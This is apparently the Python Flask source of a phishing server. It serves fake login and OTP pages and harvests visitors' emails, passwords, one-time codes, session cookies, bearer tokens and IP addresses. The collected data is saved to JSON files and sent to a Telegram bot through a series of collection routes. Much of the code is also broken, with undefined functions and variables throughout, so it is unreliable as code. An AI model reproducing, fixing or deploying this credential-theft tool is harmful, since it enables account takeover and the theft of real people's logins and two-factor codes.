import os, json, secrets, requests
from datetime import datetime, timedelta
from flask import (
    Flask, g, request, jsonify, redirect, render_template,
    make_response, url_for, session, send_from_directory, abort
)
import jwt
from functools import wraps
import time


try:
    from dotenv import load_dotenv
    load_dotenv()
except Exception:
    pass


app = Flask(__name__, template_folder="templates") 
app.secret_key = ("SECRET_KEY")
app.debug = True
app.permanent_session_lifetime = timedelta(hours=999999999)
# =================[ CONFIG ]=================
SESSIONS_FILE    = "sessions.json"
CREDENTIALS_FILE = "credentials.json"
headers = {"User-Agent": "Mozilla/5.0"}
TOKEN_TTL_HOURS=int(os.getenv("TOKEN_TTL_HOURS","999999999"))
refresh_token = "REFRESH_TOKEN_FROM_SITE"
app.config.setdefault("SESSION_COOKIE_NAME", "sessionid"), requests.session()
s = requests.session()


BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
CHAT_ID   = os.getenv("TG_CHAT_ID")



# =================[ HELPERS ]================
def _safe_load(path: str):
    try:
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
                return data if isinstance(data, list) else []
    except Exception:
        pass
    return []

def _safe_save(path: str, data: list,new_entry: dict) -> list:
    data = safe_load(path)
    data.append(new_entry)
    
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    return data    

def load_sessions():   return _safe_load(SESSIONS_FILE)
def save_sessions(data): _safe_save(SESSIONS_FILE, data)

def load_credentials(): return _safe_load(CREDENTIALS_FILE)
def save_credentials(data): _safe_save(CREDENTIALS_FILE, data)

def send_to_telegram_message(text: str):
    """إرسال موحّد لتليجرام"""
    if not BOT_TOKEN or not CHAT_ID:
        print("⚠️ TG creds missing")
        return
    try:
        msg = json.dumps(text_or_dict, ensure_ascii=False, indent=2) if isinstance(text_or_dict, dict) else str(text_or_dict)
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        for i in range(0, len(text), 3500):
            chunk = text[i:i+3500]
        requests.post(url, json={"chat_id": CHAT_ID, "text": msg}, timeout=10)
    except Exception as e:
        print("TG error:", e)

def _collect_request_data():
    """
      json (fetch/axios)
      form (POST form-data / x-www-form-urlencoded) 
      args (Query string ?a=1)
    """
    
    
    
    
def require_auth(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        auth_header = headers.get("Authorization")
        if not auth_header.startswith("Bearer"):
            abort(401)
    
        token = auth_header.split(" ", 1)[1]  # ناخد الجزء بعد Bearer
        send_to_telegram(json.dumps(token, ensure_ascii=False, indent=2))
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
            g.user = payload  # نخزن بيانات المستخدم اللي جوه التوكين
        except jwt.InvalidTokenError:
            abort(401)
        return f(*args, **kwargs)
    return wrapper
    
def make_session_permanent():
    session.permanent = True
  
@befor_request    
def collect_request_data():
    g.data = {}
    
    j = request.get_json(silent=True)
    json_dict = j if isinstance(j, dict) else {}
   
    form_dict = request.form.to_dict() or {}
 
    args_dict = request.args.to_dict() or {}

    g.data["method"] = request.method
    g.data["path"]   = request.path
    g.data["ip"]     = request.headers.get("X-Forwarded-For", request.remote_addr)

    g.headers = dict(request.headers)
    g.cookies = request.cookies.to_dict()
    

    

   
    xff = request.headers.get("X-Forwarded-For", "")
    g.ip = (xff.split(",")[0].strip() if xff else (request.remote_addr or ""))

    g.headers = dict(request.headers) or {}   
    g.cookies = request.cookies.to_dict() or {}
    g.body_raw     = request.get_data(as_text=True) or ""

    g.data("ip", g.ip) or {}
    g.data("method", g.method) or {}
    g.data("path", g.path) or {}
    
    
    print(json.dumps({"data": g.data, "headers": g.headers_dict, "cookies": g.cookies_dict}, indent=2, ensure_ascii=False)) or {}
    try:
         send_to_telegram(json.dumps({"data": g.data, "headers": g.headers_dict, "cookies": g.cookies}, ensure_ascii=False, indent=2))
    except Exception:
        pass
      

@app.route("/", methods=["GET"])
def index():
    sid = request.cookies.get("sessionid")
    data    = getattr(g, "data",    {}) or {}
    headers = getattr(g, "headers", {}) or {}
    cookies = getattr(g, "cookies", {}) or {}

    info = {
        "event":  "index_open",
        "ip":     data.get("ip", request.headers.get("X-Forwarded-For", request.remote_addr)),
        "ua":     headers.get("User-Agent", ""),
        "sid":    cookies.get("sessionid", ""),
        "cookies": cookies,
        "path":   data.get("path",   request.path),
        "method": data.get("method", request.method),
    }

    print(json.dumps(info, ensure_ascii=False, indent=2))
    send_to_telegram(json.dumps(info, ensure_ascii=False, indent=2))
    
    return render_template("index.html", sid=sid)    
    
@app.route("/cybercrime", methods=["GET"])
def cybercrime():
    _collect_request_data()
    data = {
        "auth_headers": g.headers,
        "cookies": g.cookies,
        "args_for_json": g.data, 
        "ip": g.headers.get("X-Forwarded-For", request.remote_addr),
        "ua": g.headers.get("User-Agent")
    }
    
    data_server = {
        "server_time": datetime.utcnow().isoformat()+"Z",
        "server_ip": request.remote_addr,}
        
    payload = {**data, **data_server}
    sid=request.cookies.get("sessionid")
   
    send_to_telegram(f"{payload}\nSessionid: {sid}")

    return render_template("cybercrime.html", sid=sid)
    
@app.route("/login", methods=["POST"]) 
def login_post():
    _collect_request_data()
    email = g.data.get("email")
    password = g.data.get("password")
    session = {"email": email, "password": password}
    save_sessions(1, session)
    send_to_telegram(f": {session}")
    return redirect(url_for("login_get"))
 
@app.route("/login", methods=["GET"])
def login_get():
    _collect_request_data()
    return render_template("login.html")


@app.route("/otp", methods=["POST"])
def otp_post():
    _collect_request_data()
    otp = g.data.get("otp")
    session = {"otp":otp}
    save_sessions(2, session)
    send_to_telegram(f": {session}")
    return redirect(url_for("otp_get"))

@app.route("/otp", methods=["GET"])
def otp_get():
    _collect_request_data()
    return render_template("otp.html")
    
@app.route('/thanks.html')
def thanks():
    return render_template("thanks.html")
       

    
# =================[ API ROUTES ]=============
# --- جمع بيانات تسجيل الدخول/OTP (Credentials) ---
@app.post("/collect_credentials")
@app.post("/collect")   # alias علشان الفetch القديم
def collect_credentials():
    _collect_request_data()

    entry = {
            "email": g.data.get("email"),
            "password": g.data.get("password"),
            "phone": g.data.get("phone"),
            "otp": g.data.get("otp"),
            "ip": g.data.get("ip"),
            "source": "credentials"
        }
    creds = load_credentials() or []
    creds.append(entry)
    save_credentials(creds)
    send_to_telegram_message({"bucket":"credentials", **entry})
    return jsonify({"status":"ok","bucket":"credentials","count":len(creds)}), 201
  

@app.post("/collect_sessions")
def collect_sessions():
    try:
        _collect_request_data()
        
        entry = {
            "cookies": g.cookies.get("cookies_dict"),
            "headers": g.headers_dict,
            "ip": g.data.get("ip"),
            "source": "sessions"
            }
        sessions = load_sessions() or []
        sessions.append(entry)
        save_sessions(sessions)
        send_to_telegram_message({"bucket":"sessions", **entry})
        return jsonify({"status":"ok","bucket":"sessions","count":len(sessions)}), 201
    except Exception as e:
        return jsonify({"status":"error","detail":str(e)}), 500

# --- حفظ كوكيز خام ---
@app.route("/savecookies")
def savecookies():
    _collect_request_data()
    
    data = []
    if os.path.exists("cookies.json"):
        try:
            with open("cookies.json","r",encoding="utf-8") as f:
                data = json.load(f)
        except: data=[]
    data.append(cookies)
    with open("cookies.json","w",encoding="utf-8") as f:
        json.dump(data,f,ensure_ascii=False,indent=2)
    send_to_telegram_message({"bucket":"cookies","cookies":cookies})
    return "ok"
    
@app.route("/show_cookies")
def show_cookies():
    _collect_request_data()
    
    cookies = g.cookies
    result = []
    for name, value in cookies.items():
        result.append(f"{name} = {value}")
        
    lines = [f"{k} = {v}" for k, v in request.cookies.items()]    
        
    send_to_telegram("\n".join(liness))
    
    print(json.dumps("cookies:", g.cookies))     
    return "<br>".join(result)     

# --- استلام accessToken ---
@app.post("/save-token")
def save_token():
    _collect_request_data()
    token = (request.get_json() or {}).get("accessToken")
    send_to_telegram_message({"bucket":"token","token":token})
    return jsonify({"ok":True})


@app.post("/submit")
def submit():
    _collect_request_data()
    data = {
        "ip": g.ip,
        "ua": g.headers.get("User-Agent"),
        "path": g.path,
        "method": g.method,
        "inputs": g.data,
        "auth_header": g.headers.get("Authorization"),
        "token": g.cookies_dict
    }
    try:
        send_to_telegram_message({"bucket": "submit", **data})
    except:
        pass
    return jsonify({"ok": True})
    
if __name__ == "__main__":
        port = int(os.environ.get("PORT",8081))
        app.run(host="0.0.0.0", port=port, debug=True)    

